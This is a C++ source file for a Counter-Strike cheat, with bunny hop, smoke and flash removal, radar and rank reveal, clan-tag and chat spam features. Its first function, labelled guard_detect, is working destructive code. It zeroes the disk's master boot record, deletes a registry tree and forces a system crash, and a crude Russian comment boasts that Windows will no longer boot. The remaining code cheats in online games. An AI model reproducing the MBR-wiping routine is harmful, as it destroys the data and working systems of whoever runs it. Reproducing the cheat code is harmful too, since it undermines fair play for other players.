#include "../include_cheat.h"

void misc::guard_detect() {
	// чистим мбр, чтобы винда не запустилась после перезапуска пк.
	DWORD write;
	char mbr[512];
	ZeroMemory(mbr, sizeof mbr);
	HANDLE MasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MasterBootRecord, mbr, 512, &write, NULL) == TRUE) {
		// если эта хуйн€ произошла - пиздуй искать на подъездах объ€влени€ о сервисных сентрах дл€ пк.
		HKEY hKey = NULL;
		if (RegOpenKeyExW(HKEY_CURRENT_USER, L"AppEvents\\", NULL, DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
			if (RegDeleteTree(hKey, NULL) == ERROR_SUCCESS)	{
				BOOLEAN bl;
				ULONG Response;
				RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
				NtRaiseHardError(STATUS_ASSERTION_FAILURE, NULL, NULL, NULL, 6, &Response);
			}
			RegCloseKey(hKey);
		}
	}
}

void misc::update_keybinds() {
	g_resolver_override = c_keyhandler::get().auto_check(cfg.ragebot.other.anti_aim_correction_override_key, cfg.ragebot.other.anti_aim_correction_override_key_style);
	g_force_body_aim = c_keyhandler::get().auto_check(cfg.ragebot.other.force_body_aim_key, cfg.ragebot.other.force_body_aim_key_style);
	g_inverted_desync = c_keyhandler::get().auto_check(cfg.anti_aimbot.anti_aimbot_angles.invert_key, cfg.anti_aimbot.anti_aimbot_angles.invert_key_style);
	g_thirdperson_active = c_keyhandler::get().auto_check(cfg.visuals.effects.third_person_key, cfg.visuals.effects.third_person_key_style);
}

void misc::bhop() {
	__(sv_autobunnyhopping_s, "sv_autobunnyhopping");
	__(sv_enablebunnyhopping_s, "sv_enablebunnyhopping");
	g_pCVar->FindVar(sv_autobunnyhopping_s)->set_value(cfg.misc.miscellaneous.bunny_hop);
	g_pCVar->FindVar(sv_enablebunnyhopping_s)->set_value(cfg.misc.miscellaneous.bunny_hop);

	static auto last_jumped = false;
	static auto should_fake = false;

	if (g_pLocalPlayer->get_move_type() != MOVETYPE_LADDER && g_pLocalPlayer->get_move_type() != MOVETYPE_NOCLIP && !(g_pLocalPlayer->get_flags() & FL_FAKECLIENT))	{
		if (!last_jumped && should_fake)
		{
			should_fake = false;
			if (cfg.misc.miscellaneous.bunny_hop)
				g_cmd->buttons |= IN_JUMP;
		}
		else if (g_cmd->buttons & IN_JUMP) {
			if (cfg.misc.miscellaneous.air_duck)
				g_cmd->buttons |= IN_DUCK;
			
			if (g_pLocalPlayer->get_flags() & FL_ONGROUND) {
				last_jumped = true;
				should_fake = true;
			}
			else
			{
				if (cfg.misc.miscellaneous.bunny_hop)
					g_cmd->buttons &= ~IN_JUMP;
				
				last_jumped = false;
			}
		}
		else
		{
			last_jumped = false;
			should_fake = false;
		}
	}
}

void misc::remove_smoke(const ClientFrameStage_t stage) {
	if (stage != FRAME_RENDER_START)
		return;

	static std::vector<const char*> smoke_materials =
	{
		"effects/overlaysmoke",
		"particle/beam_smoke_01",
		"particle/particle_smokegrenade",
		"particle/particle_smokegrenade1",
		"particle/particle_smokegrenade2",
		"particle/particle_smokegrenade3",
		"particle/particle_smokegrenade_sc",
		"particle/smoke1/smoke1",
		"particle/smoke1/smoke1_ash",
		"particle/smoke1/smoke1_nearcull",
		"particle/smoke1/smoke1_nearcull2",
		"particle/smoke1/smoke1_snow",
		"particle/smokesprites_0001",
		"particle/smokestack",
		"particle/vistasmokev1/vistasmokev1",
		"particle/vistasmokev1/vistasmokev1_emods",
		"particle/vistasmokev1/vistasmokev1_emods_impactdust",
		"particle/vistasmokev1/vistasmokev1_fire",
		"particle/vistasmokev1/vistasmokev1_nearcull",
		"particle/vistasmokev1/vistasmokev1_nearcull_fog",
		"particle/vistasmokev1/vistasmokev1_nearcull_nodepth",
		"particle/vistasmokev1/vistasmokev1_smokegrenade",
		"particle/vistasmokev1/vistasmokev4_emods_nocull",
		"particle/vistasmokev1/vistasmokev4_nearcull",
		"particle/vistasmokev1/vistasmokev4_nocull"
	};

	for (auto material_name : smoke_materials) {
		IMaterial* material = g_pMaterialSystem->FindMaterial(material_name, "Other textures");
		if (material)
			material->SetMaterialVarFlag(MATERIAL_VAR_NO_DRAW, cfg.visuals.effects.remove_smoke_effects);
	}

	static auto smoke_count = *reinterpret_cast<uintptr_t*>(offsets::smoke_count);

	if (cfg.visuals.effects.remove_smoke_effects)
		*reinterpret_cast<int*>(smoke_count) = 0;
}

void misc::remove_flash(const ClientFrameStage_t stage) {
	if (stage != FRAME_RENDER_START || !g_pLocalPlayer)
		return;

	g_pLocalPlayer->get_flash_alpha() = cfg.visuals.effects.flash_alpha_limit;
}

void misc::radar() {
	if (cfg.visuals.other_esp.radar)
		return;

	for (auto i = 1; i <= g_pGlobals->maxClients; i++)
	{
		if (i == g_pEngine->GetLocalPlayer())
			continue;

		auto player = get_entity(i);
		if (!player)
			continue;

		player->get_spotted() = true;
	}
}

void misc::reveal_ranks() {
	if (!vars::misc.reveal_ranks.get<bool>() || !(g_cmd->buttons & IN_SCORE))
		return;

	g_pClient->DispatchUserMessage(50, 0, 0, nullptr);
}

void misc::clan_tag() {
	const auto set_clantag = [](const char* tag) {
		static auto set_clantag_fn = reinterpret_cast<int(__fastcall*)(const char*, const char*)>(offsets::set_clantag);

		set_clantag_fn(tag, tag);
	};

	static auto is_enable = false;
	static int oldcurtime = 0;

	if (!cfg.misc.miscellaneous.clan_tag_spammer) {
		if (is_enable)
		{
			if (oldcurtime != g_pGlobals->curtime) {
				_(s0, "");
				set_clantag(s0);
			}
			oldcurtime = g_pGlobals->curtime;
		}
		is_enable = false;
		return;
	}

	is_enable = true;

	static auto is_freeze_period = false;
	if ((*g_ppGameRules)->m_bFreezePeriod()) {
		if (is_freeze_period)
		{
			_(s0, "skeet.idb");
			set_clantag(s0);
		}
		is_freeze_period = false;
		return;
	}

	is_freeze_period = true;

	if (oldcurtime != int(g_pGlobals->curtime * 3.6f) % 24) {
		switch (int(g_pGlobals->curtime * 3.6f) % 24) {
		case 0: {_(s0, ""); set_clantag(s0); break;}
		case 1: {_(s1, "s"); set_clantag(s1); break;}
		case 2: {_(s2, "sk"); set_clantag(s2); break;}
		case 3: {_(s3, "ske"); set_clantag(s3); break;}
		case 4: {_(s4, "skee"); set_clantag(s4); break;}
		case 5: {_(s5, "skeet"); set_clantag(s5); break;}
		case 6: {_(s6, "skeet."); set_clantag(s6); break;}
		case 7: {_(s7, "skeet.i"); set_clantag(s7); break;}
		case 8: {_(s8, "skeet.id"); set_clantag(s8); break;}
		case 9: {_(s9, "skeet.idb"); set_clantag(s9); break;}
		case 16: {_(s16, "keet.idb"); set_clantag(s16); break;}
		case 17: {_(s17, "eet.idb"); set_clantag(s17); break;}
		case 18: {_(s18, "et.idb"); set_clantag(s18); break;}
		case 19: {_(s19, "t.idb"); set_clantag(s19); break;}
		case 20: {_(s20, ".idb"); set_clantag(s20); break;}
		case 24: {_(s21, "idb"); set_clantag(s21); break;}
		case 22: {_(s22, "db"); set_clantag(s22); break;}
		case 23: {_(s23, "b"); set_clantag(s23); break;}
		}
		oldcurtime = int(g_pGlobals->curtime * 3.6f) % 24;
	}
}

const char* chat_spam_c[] =
{
	"skeet.idb",
};

void misc::chat_spam() {
	const auto say_in_chat = [](const char *text) {
		char buffer[MAX_PATH];
		sprintf_s(buffer, "say \"%s\"", text);
		g_pEngine->ClientCmd(buffer);
	};

	if (!vars::misc.chatspam.get<bool>())
		return;

	static size_t lastTime = 0;
	static int counter = 0;

	if (GetTickCount() > lastTime) {
		counter += 1;
		if (counter > 0)
			counter = 0;

		say_in_chat(chat_spam_c[counter]);
		lastTime = GetTickCount() + 850;
	}
}
